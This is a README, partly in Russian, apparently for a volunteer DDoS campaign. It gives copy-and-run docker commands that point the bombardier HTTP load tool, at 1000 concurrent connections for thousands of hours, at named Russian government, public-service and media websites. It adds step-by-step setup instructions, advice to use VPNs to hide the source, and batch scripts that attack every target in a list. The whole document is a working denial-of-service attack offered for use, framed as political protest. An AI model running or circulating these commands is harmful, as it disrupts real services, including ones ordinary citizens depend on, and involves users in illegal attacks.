# bombardier
Fight agains propoganda

# If you have kubertnetes cluster `./run_all_kuber.sh`
easiest way 

`docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l http://kremlin.ru`
<br>
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://mil.ru`
<br>
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l http://www.scrf.gov.ru`
<br>
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://ach.gov.ru`
<br>
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://epp.genproc.gov.ru`
<br>
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://www.gosuslugi.ru`
<br>
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://www.1tv.ru`
<br>
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://mid.ru`
<br>

# Инструкция для пользователей Windows и Mac: 
1. Установить Docker: https://www.docker.com/products/docker-desktop 
2. Запустить докер и убедиться, что Docker Started 
3. Зайти сюда https://github.com/almerico/bombardier/blob/main/README.md 
4. Для лучшего результата используйте ВПН and (
<br>Psiphon
<br>Secure VPN
<br>Proton VPN 
<br>SurfShark
or
<br>Clear VPN 
<br>Proton VPN
<br>Nord VPN)

5. Найти в программах Windows Command Prompt и запустить от имени Администратора 
6. Запустить столько отдельных CMD консолей, сколько вы собираетесь запускать скриптов (каждая строчка - скрипт) 
7. Запустить все цели из resources.txt для виндовс из Консли run_windows.bat для Linux/Mac ./run_all_docker.sh для целей из resources.txt (или ./run_all_docker.sh файл-с-целями)
8. Для выполнения с конкретными целями - Скопировать скрипт (например docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l http://kremlin.ru) и нажать энтер 
9. Убедиться, что процесс пошёл 
10. Ждать падения рашки


# Instruction for Windows and Mac: 
1. Install Docker: https://www.docker.com/products/docker-desktop (For mac please pay attention if you download version for the correct chip) 
2. Launch Docker and make sure that Docker is running 
3. Go here https://github.com/almerico/bombardier/blob/main/README.md 
4. For best result use VPN(
<br>Psiphon
<br>Secure VPN
<br>Proton VPN 
<br>SurfShark
or
<br>Clear VPN 
<br>Proton VPN
<br>Nord VPN)
5. Find in application Windows Command Prompt or Terminal for Mac and launch as an admin. 
6. run all aims from resources.txt for winodws - `run_windows.bat` for Linux/Mac `./run_all_docker.sh ` for resources.txt  or ( .`/run_all_docker.sh your_aim_file`)
7. If you want select aims mainally . `docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l https://mid.ru` Open as many separate CMD consoles as many scripts you are going to launch (each line – one script) 
8. Make sure that the process started  
9. Wait till russia fall
"# bombardier" 
